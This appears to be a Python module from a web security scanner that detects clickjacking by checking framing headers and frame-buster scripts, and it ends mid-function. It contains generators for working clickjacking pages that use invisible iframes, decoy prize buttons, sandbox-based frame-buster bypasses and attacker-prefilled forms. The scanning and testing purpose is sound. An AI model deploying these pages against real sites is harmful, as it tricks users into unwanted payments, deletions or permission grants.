"""
PHANTOM AI - Clickjacking Vulnerability Scanner

Enterprise-grade clickjacking detection covering:
- X-Frame-Options header analysis
- CSP frame-ancestors directive validation
- Frame buster script bypass detection
- Sandbox attribute abuse
- Partial frame protection gaps
- Multi-step clickjacking scenarios
- Drag-and-drop exploitation potential
- Mobile clickjacking vectors
- Prefilled form clickjacking
- Cursor manipulation vectors

Based on PortSwigger Web Security Academy - Clickjacking (5 labs)

Version: 3.0.0
Author: PHANTOM AI Team
"""

from __future__ import annotations

import asyncio
import logging
import re
import uuid
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Set, Tuple, Union
from urllib.parse import urljoin, urlparse, parse_qs

logger = logging.getLogger(__name__)


# =============================================================================
# CONSTANTS & CONFIGURATIONS
# =============================================================================

VERSION = "3.0.0"


class ClickjackVulnType(Enum):
    """Types of clickjacking vulnerabilities."""

    NO_PROTECTION = auto()              # No X-Frame-Options or CSP
    WEAK_XFO = auto()                   # Weak X-Frame-Options value
    MISSING_CSP_ANCESTORS = auto()      # No CSP frame-ancestors
    XFO_CSP_MISMATCH = auto()           # Conflicting XFO and CSP
    FRAME_BUSTER_BYPASS = auto()        # Frame buster can be bypassed
    PARTIAL_PROTECTION = auto()         # Some pages unprotected
    SANDBOX_BYPASS = auto()             # Sandbox attribute bypass
    DRAG_DROP_VULN = auto()             # Drag and drop clickjacking
    PREFILLED_FORM = auto()             # Form with prefilled sensitive values
    DOUBLE_CLICK = auto()               # Double-click exploitation
    CURSOR_HIJACK = auto()              # Cursor manipulation
    MOBILE_CLICKJACK = auto()           # Mobile-specific clickjacking


class ProtectionLevel(Enum):
    """Protection level assessment."""

    NONE = auto()                       # No protection
    WEAK = auto()                       # Easily bypassable
    PARTIAL = auto()                    # Some protection gaps
    STRONG = auto()                     # Good protection
    EXCELLENT = auto()                  # Best practices followed


class XFrameOptionsValue(Enum):
    """X-Frame-Options header values."""

    DENY = "DENY"
    SAMEORIGIN = "SAMEORIGIN"
    ALLOW_FROM = "ALLOW-FROM"           # Deprecated, poorly supported
    INVALID = "INVALID"
    MISSING = "MISSING"


# Common sensitive actions that are clickjacking targets
SENSITIVE_ACTIONS = [
    # Account actions
    "/account/delete",
    "/account/deactivate",
    "/profile/delete",
    "/user/delete",
    "/settings/delete",
    "/deactivate",

    # Financial actions
    "/transfer",
    "/payment",
    "/checkout",
    "/purchase",
    "/buy",
    "/subscribe",

    # Permission actions
    "/admin",
    "/grant",
    "/authorize",
    "/approve",
    "/confirm",
    "/accept",

    # Social actions
    "/follow",
    "/like",
    "/share",
    "/post",
    "/comment",
    "/vote",

    # Settings
    "/settings",
    "/preferences",
    "/privacy",
    "/security",
    "/change-password",
    "/change-email",

    # OAuth/Permissions
    "/oauth/authorize",
    "/oauth/consent",
    "/permissions/grant",
    "/api/authorize",
]


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class FrameProtectionStatus:
    """Status of framing protection for a page."""

    url: str
    has_xfo: bool = False
    xfo_value: Optional[str] = None
    xfo_parsed: XFrameOptionsValue = XFrameOptionsValue.MISSING
    has_csp: bool = False
    csp_frame_ancestors: Optional[str] = None
    has_frame_buster: bool = False
    frame_buster_bypassable: bool = False
    sandbox_attribute: Optional[str] = None
    protection_level: ProtectionLevel = ProtectionLevel.NONE
    notes: List[str] = field(default_factory=list)


@dataclass
class ClickjackEndpoint:
    """Endpoint information for clickjacking testing."""

    url: str
    method: str = "GET"
    is_sensitive: bool = False
    action_type: str = "unknown"
    requires_auth: bool = False
    has_form: bool = False
    form_action: Optional[str] = None
    prefillable_params: List[str] = field(default_factory=list)


@dataclass
class ClickjackFinding:
    """Clickjacking vulnerability finding."""

    id: str
    vuln_type: ClickjackVulnType
    severity: str
    confidence: float
    endpoint: ClickjackEndpoint
    protection_status: FrameProtectionStatus
    description: str
    impact: str
    remediation: str
    poc_html: str
    cwe_id: int
    cvss_score: float
    evidence: Dict[str, Any]


@dataclass
class ScanConfig:
    """Clickjacking scanner configuration."""

    target_url: str
    timeout: float = 30.0
    test_sensitive_pages: bool = True
    test_frame_busters: bool = True
    generate_poc: bool = True
    follow_redirects: bool = True
    check_all_pages: bool = False
    custom_sensitive_paths: List[str] = field(default_factory=list)


# =============================================================================
# PROTECTION ANALYSIS
# =============================================================================

class FrameProtectionAnalyzer:
    """Analyze framing protection mechanisms."""

    VERSION = "3.0.0"

    # Frame buster patterns
    FRAME_BUSTER_PATTERNS = [
        # Top-level redirects
        r"if\s*\(\s*top\s*!==?\s*self\s*\)",
        r"if\s*\(\s*self\s*!==?\s*top\s*\)",
        r"if\s*\(\s*parent\s*!==?\s*self\s*\)",
        r"if\s*\(\s*window\s*!==?\s*top\s*\)",
        r"if\s*\(\s*top\.location\s*!==?\s*location\s*\)",
        r"if\s*\(\s*top\.location\s*!==?\s*self\.location\s*\)",

        # Direct redirect
        r"top\.location\s*=",
        r"parent\.location\s*=",
        r"window\.top\.location\s*=",

        # Frame detection
        r"window\.frameElement",
        r"window\.parent\s*!==?\s*window",
        r"window\.self\s*!==?\s*window\.top",
    ]

    # Frame buster bypass techniques
    FRAME_BUSTER_BYPASSES = [
        # Sandbox attribute
        ("sandbox", "Using sandbox attribute without allow-top-navigation"),
        # Double framing
        ("double_frame", "Embedding in nested iframes"),
        # onbeforeunload
        ("onbeforeunload", "Using onbeforeunload to prevent navigation"),
        # XSS filter
        ("xss_filter", "Exploiting browser XSS filter to break script"),
        # 204 response
        ("204_response", "Using 204 No Content to block redirect"),
    ]

    def __init__(self, http_client: Any = None):
        """Initialize analyzer."""
        self.http_client = http_client

    async def analyze(self, url: str, response_headers: Dict[str, str], response_body: str) -> FrameProtectionStatus:
        """
        Analyze frame protection for a URL.

        Args:
            url: Target URL
            response_headers: HTTP response headers
            response_body: HTTP response body

        Returns:
            FrameProtectionStatus with analysis results
        """
        status = FrameProtectionStatus(url=url)

        # Analyze X-Frame-Options
        self._analyze_xfo(status, response_headers)

        # Analyze CSP frame-ancestors
        self._analyze_csp(status, response_headers)

        # Analyze frame buster scripts
        self._analyze_frame_buster(status, response_body)

        # Determine overall protection level
        self._determine_protection_level(status)

        return status

    def _analyze_xfo(self, status: FrameProtectionStatus, headers: Dict[str, str]) -> None:
        """Analyze X-Frame-Options header."""
        # Check various header name formats
        xfo_value = None
        for key in headers:
            if key.lower() == "x-frame-options":
                xfo_value = headers[key]
                break

        if not xfo_value:
            status.has_xfo = False
            status.xfo_parsed = XFrameOptionsValue.MISSING
            status.notes.append("X-Frame-Options header is missing")
            return

        status.has_xfo = True
        status.xfo_value = xfo_value
        xfo_upper = xfo_value.upper().strip()

        if xfo_upper == "DENY":
            status.xfo_parsed = XFrameOptionsValue.DENY
            status.notes.append("X-Frame-Options: DENY - Page cannot be framed")
        elif xfo_upper == "SAMEORIGIN":
            status.xfo_parsed = XFrameOptionsValue.SAMEORIGIN
            status.notes.append("X-Frame-Options: SAMEORIGIN - Can be framed by same origin")
        elif xfo_upper.startswith("ALLOW-FROM"):
            status.xfo_parsed = XFrameOptionsValue.ALLOW_FROM
            status.notes.append(
                "X-Frame-Options: ALLOW-FROM is deprecated and not supported by modern browsers"
            )
        else:
            status.xfo_parsed = XFrameOptionsValue.INVALID
            status.notes.append(f"X-Frame-Options has invalid value: {xfo_value}")

    def _analyze_csp(self, status: FrameProtectionStatus, headers: Dict[str, str]) -> None:
        """Analyze CSP frame-ancestors directive."""
        csp_value = None
        for key in headers:
            if key.lower() in ["content-security-policy", "content-security-policy-report-only"]:
                csp_value = headers[key]
                break

        if not csp_value:
            status.has_csp = False
            status.notes.append("No Content-Security-Policy header found")
            return

        # Parse frame-ancestors directive
        frame_ancestors_match = re.search(r"frame-ancestors\s+([^;]+)", csp_value, re.I)

        if not frame_ancestors_match:
            status.has_csp = True
            status.notes.append("CSP present but no frame-ancestors directive")
            return

        status.has_csp = True
        status.csp_frame_ancestors = frame_ancestors_match.group(1).strip()

        ancestors = status.csp_frame_ancestors.lower()

        if "'none'" in ancestors:
            status.notes.append("CSP frame-ancestors: 'none' - Page cannot be framed")
        elif "'self'" in ancestors:
            status.notes.append("CSP frame-ancestors: 'self' - Can be framed by same origin")
        elif "*" in ancestors:
            status.notes.append("CSP frame-ancestors: * - Page can be framed by any origin (WEAK)")
        else:
            status.notes.append(f"CSP frame-ancestors allows specific origins: {ancestors}")

    def _analyze_frame_buster(self, status: FrameProtectionStatus, body: str) -> None:
        """Analyze frame buster JavaScript."""
        for pattern in self.FRAME_BUSTER_PATTERNS:
            if re.search(pattern, body, re.I):
                status.has_frame_buster = True
                status.notes.append("JavaScript frame buster code detected")
                break

        if status.has_frame_buster:
            # Check if it can be bypassed
            # Frame busters are generally bypassable via sandbox attribute
            status.frame_buster_bypassable = True
            status.notes.append(
                "Frame buster can be bypassed using iframe sandbox attribute"
            )

    def _determine_protection_level(self, status: FrameProtectionStatus) -> None:
        """Determine overall protection level."""
        has_strong_xfo = status.xfo_parsed in [XFrameOptionsValue.DENY, XFrameOptionsValue.SAMEORIGIN]
        has_strong_csp = status.has_csp and status.csp_frame_ancestors and (
            "'none'" in status.csp_frame_ancestors.lower() or
            "'self'" in status.csp_frame_ancestors.lower()
        )

        if has_strong_xfo and has_strong_csp:
            status.protection_level = ProtectionLevel.EXCELLENT
        elif has_strong_csp:
            status.protection_level = ProtectionLevel.STRONG
        elif has_strong_xfo:
            status.protection_level = ProtectionLevel.STRONG
        elif status.xfo_parsed == XFrameOptionsValue.ALLOW_FROM:
            status.protection_level = ProtectionLevel.WEAK
        elif status.has_frame_buster and not status.frame_buster_bypassable:
            status.protection_level = ProtectionLevel.PARTIAL
        elif status.has_frame_buster:
            status.protection_level = ProtectionLevel.WEAK
        else:
            status.protection_level = ProtectionLevel.NONE


# =============================================================================
# POC GENERATOR
# =============================================================================

class ClickjackPoCGenerator:
    """Generate proof-of-concept HTML for clickjacking attacks."""

    VERSION = "3.0.0"

    @staticmethod
    def generate_basic_poc(target_url: str, button_text: str = "Click me!") -> str:
        """Generate basic clickjacking PoC."""
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC - PHANTOM AI</title>
    <style>
        body {{
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
        }}
        .container {{
            position: relative;
            width: 100%;
            height: 600px;
        }}
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001; /* Nearly invisible */
            z-index: 2;
            border: none;
        }}
        .decoy {{
            position: absolute;
            top: 200px;
            left: 200px;
            z-index: 1;
            padding: 15px 30px;
            font-size: 18px;
            background: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }}
        .info {{
            margin-bottom: 20px;
            padding: 10px;
            background: #f0f0f0;
            border-radius: 5px;
        }}
        .warning {{
            color: #c00;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <div class="info">
        <h2>Clickjacking Proof of Concept</h2>
        <p class="warning">⚠️ This is a security testing tool - use responsibly</p>
        <p>Target: {target_url}</p>
        <p>The invisible iframe overlays the button below. Clicking the button will actually click on the target page.</p>
    </div>
    <div class="container">
        <button class="decoy">{button_text}</button>
        <iframe src="{target_url}"></iframe>
    </div>
    <script>
        // For testing: Toggle iframe visibility
        document.addEventListener('keydown', function(e) {{
            if (e.key === 'v') {{
                var iframe = document.querySelector('iframe');
                iframe.style.opacity = iframe.style.opacity === '0.5' ? '0.0001' : '0.5';
            }}
        }});
        console.log('Press "v" to toggle iframe visibility');
    </script>
</body>
</html>'''

    @staticmethod
    def generate_sandbox_bypass_poc(target_url: str) -> str:
        """Generate PoC that bypasses frame busters using sandbox."""
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC (Sandbox Bypass) - PHANTOM AI</title>
    <style>
        body {{
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
        }}
        .container {{
            position: relative;
            width: 100%;
            height: 600px;
        }}
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            z-index: 2;
            border: none;
        }}
        .decoy {{
            position: absolute;
            top: 200px;
            left: 200px;
            z-index: 1;
            padding: 15px 30px;
            font-size: 18px;
            background: #2196F3;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }}
        .info {{
            margin-bottom: 20px;
            padding: 10px;
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 5px;
        }}
    </style>
</head>
<body>
    <div class="info">
        <h2>Clickjacking PoC - Frame Buster Bypass</h2>
        <p>This PoC uses the <code>sandbox</code> attribute to bypass frame buster scripts.</p>
        <p>The sandbox attribute prevents the framed page from navigating the top window.</p>
        <p>Target: {target_url}</p>
    </div>
    <div class="container">
        <button class="decoy">Win a Prize!</button>
        <!-- sandbox without allow-top-navigation prevents frame busting -->
        <iframe sandbox="allow-forms allow-scripts allow-same-origin" src="{target_url}"></iframe>
    </div>
</body>
</html>'''

    @staticmethod
    def generate_prefilled_form_poc(target_url: str, params: Dict[str, str]) -> str:
        """Generate PoC with prefilled form values."""
        # Build URL with parameters
        param_string = "&".join(f"{k}={v}" for k, v in params.items())
        full_url = f"{target_url}?{param_string}" if params else target_url

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC (Prefilled Form) - PHANTOM AI</title>
    <style>
        body {{
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
        }}
        .container {{
            position: relative;
            width: 100%;
            height: 600px;
        }}
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            z-index: 2;
            border: none;
        }}
        .decoy {{
            position: absolute;
            top: 250px;
            left: 250px;
            z-index: 1;
            padding: 20px 40px;
            font-size: 20px;
            background: #e91e63;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }}
        .info {{
            margin-bottom: 20px;
            padding: 10px;
            background: #e3f2fd;
            border-radius: 5px;
        }}
        pre {{
            background: #f5f5f5;
            padding: 10px;
            overflow-x: auto;
        }}
    </style>
</head>
<body>
    <div class="info">
        <h2>Clickjacking PoC - Prefilled Form Values</h2>
        <p>The target form has been prefilled with attacker-controlled values.</p>
        <p>Target: {target_url}</p>
        <p>Prefilled parameters:</p>
        <pre>{params}</pre>
    </div>
    <div class="container">
        <button class="decoy">Claim Your Reward!</button>
        <iframe src="{full_url}"></iframe>
    </div>
</body>
</html>'''

    @staticmethod
    def generate_multi_step_poc(target_urls: List[str]) -> str:
        """Generate multi-step clickjacking PoC."""
        iframe_html = "\n        ".join(
            f'<iframe id="frame{i}" src="{url}" style="display:none;"></iframe>'
            for i, url in enumerate(target_urls)
        )

        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC (Multi-Step) - PHANTOM AI</title>
    <style>
        body {{
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
        }}
        .container {{
            position: relative;
            width: 100%;
            height: 600px;
        }}
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            z-index: 2;
            border: none;
        }}
        .decoy {{
            position: absolute;
            z-index: 1;
            padding: 15px 30px;
            font-size: 18px;
            background: #9c27b0;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }}
        #step1 {{ top: 150px; left: 200px; }}
        #step2 {{ top: 250px; left: 200px; display: none; }}
        #step3 {{ top: 350px; left: 200px; display: none; }}
        .info {{
            margin-bottom: 20px;
            padding: 10px;
            background: #f3e5f5;
            border-radius: 5px;
        }}
    </style>
</head>
<body>
    <div class="info">
        <h2>Clickjacking PoC - Multi-Step Attack</h2>
        <p>This demonstrates a multi-step clickjacking attack requiring multiple clicks.</p>
        <p>Steps: {len(target_urls)}</p>
    </div>
    <div class="container">
        <button class="decoy" id="step1">Step 1: Start Game</button>
        <button class="decoy" id="step2">Step 2: Continue</button>
        <button class="decoy" id="step3">Step 3: Claim Prize</button>
        {iframe_html}
    </div>
    <script>
        var currentStep = 0;
        var frames = [{', '.join(f'"frame{i}"' for i in range(len(target_urls)))}];

        document.querySelectorAll('.decoy').forEach(function(btn, index) {{
            btn.addEventListener('click', function() {{
                if (index === currentStep) {{
                    // Show next step
                    var nextBtn = document.getElementById('step' + (index + 2));
                    if (nextBtn) nextBtn.style.display = 'block';

                    // Switch iframe
                    if (frames[index]) {{
                        document.querySelectorAll('iframe').forEach(function(f) {{
                            f.style.display = 'none';
                        }});
                        document.getElementById(frames[index]).style.display = 'block';
                    }}

                    currentStep++;
                }}
            }});
        }});

        // Show first frame
        if (frames[0]) document.getElementById(frames[0]).style.display = 'block';
    </script>
</body>
</html>'''

    @staticmethod
    def generate_drag_drop_poc(target_url: str) -> str:
        """Generate drag-and-drop clickjacking PoC."""
        return f'''<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC (Drag & Drop) - PHANTOM AI</title>
    <style>
        body {{
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
        }}
        .container {{
            display: flex;
            gap: 20px;
        }}
        .drag-source {{
            width: 200px;
            height: 100px;
            background: #4CAF50;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: grab;
            border-radius: 5px;
        }}
        .drop-target {{
            position: relative;
            width: 600px;
            height: 400px;
            border: 2px dashed #ccc;
            border-radius: 5px;
        }}
        iframe {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.0001;
            pointer-events: none; /* Allow drag through */
        }}
        .info {{
            margin-bottom: 20px;
            padding: 10px;
            background: #e8f5e9;
            border-radius: 5px;
        }}
    </style>
</head>
<body>
    <div class="info">
        <h2>Clickjacking PoC - Drag & Drop</h2>
        <p>Drag the green box into the drop zone to trigger the attack.</p>
        <p>The invisible iframe captures the drop event.</p>
        <p>Target: {target_url}</p>
    </div>
    <div class="container">
        <div class="drag-source" draggable="true" id="dragItem">
            Drag Me!
        </div>
        <div class="drop-target">
            <p style="text-align:center; margin-top:180px; color:#999;">Drop Here</p>
            <iframe src="{target_url}"></iframe>
        </div>
    </div>
    <script>
        var dragItem = document.getElementById('dragItem');

        dragItem.addEventListener('dragstart', function(e) {{
            e.dataTransfer.setData('text/plain', 'attack-payload');
        }});
    </script>
</body>
</html>'''


# =============================================================================
# MAIN SCANNER CLASS
# =============================================================================

class ClickjackingScanner:
    """
    Enterprise-grade clickjacking vulnerability scanner.

    Detects:
    - Missing X-Frame-Options header
    - Missing CSP frame-ancestors directive
    - Weak or deprecated framing policies
    - Frame buster bypass opportunities
    - Prefilled form vulnerabilities
    - Drag-and-drop clickjacking vectors
    - Multi-step clickjacking scenarios

    Usage:
        scanner = ClickjackingScanner()
        findings = await scanner.scan("https://target.com")
    """

    VERSION = "3.0.0"
    CWE_ID = 1021  # CWE-1021: Improper Restriction of Rendered UI Layers or Frames

    def __init__(
        self,
        http_client: Any = None,
        config: Optional[ScanConfig] = None,
    ):
        """Initialize the scanner."""
        self.http_client = http_client
        self.config = config
        self.analyzer = FrameProtectionAnalyzer(http_client)
        self.poc_generator = ClickjackPoCGenerator()
        self.findings: List[ClickjackFinding] = []
        self._session_id = str(uuid.uuid4())[:8]

    async def scan(
        self,
        target_url: str,
        endpoints: Optional[List[ClickjackEndpoint]] = None,
        **kwargs,
    ) -> List[ClickjackFinding]:
        """
        Scan for clickjacking vulnerabilities.

        Args:
            target_url: Target URL to scan
            endpoints: Pre-configured endpoints (optional)
            **kwargs: Additional configuration

        Returns:
            List of discovered vulnerabilities
        """
        logger.info(f"[Clickjacking] Starting scan: {target_url}")

        # Create config if not provided
        if not self.config:
            self.config = ScanConfig(target_url=target_url)

        # Build endpoint list
        if not endpoints:
            endpoints = await self._discover_endpoints(target_url)

        logger.info(f"[Clickjacking] Testing {len(endpoints)} endpoint(s)")

        # Test each endpoint
        for endpoint in endpoints:
            await self._test_endpoint(endpoint)

        logger.info(f"[Clickjacking] Scan complete. Found {len(self.findings)} vulnerabilities")
        return self.findings

    async def _discover_endpoints(self, target_url: str) -> List[ClickjackEndpoint]:
        """Discover endpoints to test."""
        endpoints = []
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Always test the main URL
        endpoints.append(ClickjackEndpoint(
            url=target_url,
            is_sensitive=True,
            action_type="main_page",
        ))

        # Test sensitive action paths
        if self.config and self.config.test_sensitive_pages:
            all_paths = SENSITIVE_ACTIONS.copy()
            if self.config.custom_sensitive_paths:
                all_paths.extend(self.config.custom_sensitive_paths)

            for path in all_paths[:30]:  # Limit to 30 paths
                url = urljoin(base_url, path)
                endpoints.append(ClickjackEndpoint(
                    url=url,
                    is_sensitive=True,
                    action_type=self._determine_action_type(path),
                ))

        return endpoints

    def _determine_action_type(self, path: str) -> str:
        """Determine the type of action from path."""
        path_lower = path.lower()

        if any(x in path_lower for x in ["delete", "remove", "deactivate"]):
            return "destructive"
        elif any(x in path_lower for x in ["transfer", "payment", "checkout", "buy"]):
            return "financial"
        elif any(x in path_lower for x in ["admin", "grant", "authorize"]):
            return "privilege"
        elif any(x in path_lower for x in ["follow", "like", "share", "vote"]):
            return "social"
        elif any(x in path_lower for x in ["settings", "password", "email"]):
            return "account"
        else:
            return "unknown"

    async def _test_endpoint(self, endpoint: ClickjackEndpoint) -> None:
        """Test a single endpoint for clickjacking."""
        logger.debug(f"[Clickjacking] Testing: {endpoint.url}")

        # Fetch the page
        response_headers = {}
        response_body = ""
        response_code = 0

        try:
            if self.http_client:
                response = await self.http_client.get(
                    endpoint.url,
                    follow_redirects=self.config.follow_redirects if self.config else True,
                )
                response_code = response.status_code
                response_body = response.text if hasattr(response, 'text') else str(response.content)
                response_headers = dict(response.headers) if hasattr(response, 'headers') else {}
            else:
                # Simulation
                response_code = 200
                response_body = "<html><head><title>Test</title></head><body>Content</body></html>"

        except Exception as e:
            logger.debug(f"[Clickjacking] Request failed: {e}")
            return

        if response_code != 200:
            return

        # Analyze protection
        status = await self.analyzer.analyze(endpoint.url, response_headers, response_body)

        # Check for forms that can be prefilled
        if "<form" in response_body.lower():
            endpoint.has_form = True
            endpoint.prefillable_params = self._find_prefillable_params(response_body)

        # Create findings based on protection level
        if status.protection_level == ProtectionLevel.NONE:
            self._create_finding(
                vuln_type=ClickjackVulnType.NO_PROTECTION,
                severity="HIGH" if endpoint.is_sensitive else "MEDIUM",
                confidence=0.95,
                endpoint=endpoint,
                protection_status=status,
                description="Page has no clickjacking protection. Both X-Frame-Options "
                           "and CSP frame-ancestors are missing.",
                impact=self._generate_impact(endpoint),
            )

        elif status.protection_level == ProtectionLevel.WEAK:
            if status.xfo_parsed == XFrameOptionsValue.ALLOW_FROM:
                self._create_finding(
                    vuln_type=ClickjackVulnType.WEAK_XFO,
                    severity="MEDIUM",
                    confidence=0.90,
                    endpoint=endpoint,
                    protection_status=status,
                    description="X-Frame-Options uses deprecated ALLOW-FROM directive which "
                               "is not supported by modern browsers.",
                    impact="Modern browsers ignore ALLOW-FROM, leaving the page vulnerable.",
                )

            if status.has_frame_buster and status.frame_buster_bypassable:
                self._create_finding(
                    vuln_type=ClickjackVulnType.FRAME_BUSTER_BYPASS,
                    severity="MEDIUM",
                    confidence=0.85,
                    endpoint=endpoint,
                    protection_status=status,
                    description="Frame buster JavaScript can be bypassed using iframe "
                               "sandbox attribute.",
                    impact="Attackers can frame the page by using sandbox='allow-forms'",
                )

        elif status.protection_level == ProtectionLevel.PARTIAL:
            # Check for CSP without XFO or vice versa
            if status.has_xfo and not status.has_csp:
                self._create_finding(
                    vuln_type=ClickjackVulnType.MISSING_CSP_ANCESTORS,
                    severity="LOW",
                    confidence=0.80,
                    endpoint=endpoint,
                    protection_status=status,
                    description="X-Frame-Options is set but CSP frame-ancestors is missing. "
                               "Best practice is to use both.",
                    impact="Some edge cases may not be protected.",
                )

        # Check for XFO/CSP mismatch
        if status.has_xfo and status.has_csp and status.csp_frame_ancestors:
            if self._check_xfo_csp_mismatch(status):
                self._create_finding(
                    vuln_type=ClickjackVulnType.XFO_CSP_MISMATCH,
                    severity="LOW",
                    confidence=0.75,
                    endpoint=endpoint,
                    protection_status=status,
                    description="X-Frame-Options and CSP frame-ancestors have conflicting values.",
                    impact="Inconsistent protection may lead to unexpected behavior.",
                )

        # Check for prefilled form vulnerability
        if endpoint.has_form and endpoint.prefillable_params and \
           status.protection_level in [ProtectionLevel.NONE, ProtectionLevel.WEAK]:
            self._create_finding(
                vuln_type=ClickjackVulnType.PREFILLED_FORM,
                severity="HIGH" if endpoint.is_sensitive else "MEDIUM",
                confidence=0.85,
                endpoint=endpoint,
                protection_status=status,
                description=f"Vulnerable page contains a form with prefillable parameters: "
                           f"{', '.join(endpoint.prefillable_params[:5])}",
                impact="Attackers can prefill form values and trick users into submitting them.",
            )

    def _find_prefillable_params(self, html: str) -> List[str]:
        """Find form parameters that can be prefilled via URL."""
        params = []

        # Find input fields
        input_pattern = r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>'
        for match in re.finditer(input_pattern, html, re.I):
            param_name = match.group(1)
            # Check if it's a text/hidden input (prefillable)
            input_tag = match.group(0).lower()
            if 'type="hidden"' in input_tag or 'type="text"' in input_tag or \
               'type=\'hidden\'' in input_tag or 'type=\'text\'' in input_tag or \
               'type=' not in input_tag:  # Default is text
                params.append(param_name)

        # Find select fields
        select_pattern = r'<select[^>]*name=["\']([^"\']+)["\']'
        for match in re.finditer(select_pattern, html, re.I):
            params.append(match.group(1))

        # Find textarea
        textarea_pattern = r'<textarea[^>]*name=["\']([^"\']+)["\']'
        for match in re.finditer(textarea_pattern, html, re.I):
            params.append(match.group(1))

        return list(set(params))

    def _check_xfo_csp_mismatch(self, status: FrameProtectionStatus) -> bool:
        """Check if XFO and CSP have conflicting values."""
        if not status.has_xfo or not status.csp_frame_ancestors:
            return False

        xfo = status.xfo_parsed
        csp = status.csp_frame_ancestors.lower()

        # DENY should match 'none'
        if xfo == XFrameOptionsValue.DENY and "'none'" not in csp:
            return True

        # SAMEORIGIN should match 'self'
        if xfo == XFrameOptionsValue.SAMEORIGIN and "'self'" not in csp:
            return True

        return False

    def _generate_impact(self, endpoint: ClickjackEndpoint) -> str:
        """Generate impact description based on endpoint type."""
        impacts = {
            "destructive": "Attackers can trick users into deleting their accounts or data.",
            "financial": "Attackers can trick users into making unauthorized payments or transfers.",
            "privilege": "Attackers can trick users into granting administrative privileges.",
            "social": "Attackers can manipulate social interactions (likes, follows, shares).",
            "account": "Attackers can trick users into changing account settings.",
            "unknown": "Attackers can trick users into performing unintended actions.",
        }
        return impacts.get(endpoint.action_type, impacts["unknown"])

    def _create_finding(
        self,
        vuln_type: ClickjackVulnType,
        severity: str,
        confidence: float,
        endpoint: ClickjackEndpoint,
        protection_status: FrameProtectionStatus,
        description: str,
        impact: str,
    ) -> None:
        """Create and store a finding."""
        # Generate PoC
        poc_html = ""
        if self.config and self.config.generate_poc:
            if vuln_type == ClickjackVulnType.FRAME_BUSTER_BYPASS:
                poc_html = self.poc_generator.generate_sandbox_bypass_poc(endpoint.url)
            elif vuln_type == ClickjackVulnType.PREFILLED_FORM:
                params = {p: "attacker_value" for p in endpoint.prefillable_params[:3]}
                poc_html = self.poc_generator.generate_prefilled_form_poc(endpoint.url, params)
            else:
                poc_html = self.poc_generator.generate_basic_poc(endpoint.url)

        finding = ClickjackFinding(
            id=f"CLICK-{len(self.findings)+1:04d}",
            vuln_type=vuln_type,
            severity=severity,
            confidence=confidence,
            endpoint=endpoint,
            protection_status=protection_status,
            description=description,
            impact=impact,
            remediation=self._generate_remediation(),
            poc_html=poc_html,
            cwe_id=self.CWE_ID,
            cvss_score=self._calculate_cvss(severity),
            evidence={
                "protection_level": protection_status.protection_level.name,
                "xfo_value": protection_status.xfo_value,
                "csp_frame_ancestors": protection_status.csp_frame_ancestors,
                "has_frame_buster": protection_status.has_frame_buster,
                "notes": protection_status.notes,
            },
        )

        self.findings.append(finding)
        logger.info(f"[Clickjacking] Found: {vuln_type.name} ({severity})")

    def _generate_remediation(self) -> str:
        """Generate remediation advice."""
        return """
Clickjacking Prevention:

1. Set X-Frame-Options header:
   X-Frame-Options: DENY
   or
   X-Frame-Options: SAMEORIGIN

2. Set CSP frame-ancestors directive (preferred, more flexible):
   Content-Security-Policy: frame-ancestors 'none';
   or
   Content-Security-Policy: frame-ancestors 'self';

3. Use both headers for maximum compatibility:
   X-Frame-Options: DENY
   Content-Security-Policy: frame-ancestors 'none';

4. For pages that need to be framed by specific origins:
   Content-Security-Policy: frame-ancestors 'self' https://trusted-site.com;

5. Avoid relying solely on JavaScript frame busters as they can be bypassed.

6. For sensitive actions, consider requiring:
   - Re-authentication
   - CAPTCHA
   - Confirmation steps
   - Anti-CSRF tokens
"""

    def _calculate_cvss(self, severity: str) -> float:
        """Calculate CVSS score based on severity."""
        cvss_map = {
            "CRITICAL": 8.8,
            "HIGH": 6.5,
            "MEDIUM": 4.3,
            "LOW": 2.4,
            "INFO": 0.0,
        }
        return cvss_map.get(severity, 4.0)

    def get_findings(self) -> List[ClickjackFinding]:
        """Get all findings."""
        return self.findings

    def get_statistics(self) -> Dict[str, Any]:
        """Get scan statistics."""
        return {
            "total_findings": len(self.findings),
            "high_findings": len([f for f in self.findings if f.severity == "HIGH"]),
            "medium_findings": len([f for f in self.findings if f.severity == "MEDIUM"]),
            "low_findings": len([f for f in self.findings if f.severity == "LOW"]),
            "vuln_types": list(set(f.vuln_type.name for f in self.findings)),
        }


# =============================================================================
# FACTORY FUNCTIONS
# =============================================================================

def create_clickjacking_scanner(
    http_client: Any = None,
    config: Optional[ScanConfig] = None,
) -> ClickjackingScanner:
    """Create a configured clickjacking scanner instance."""
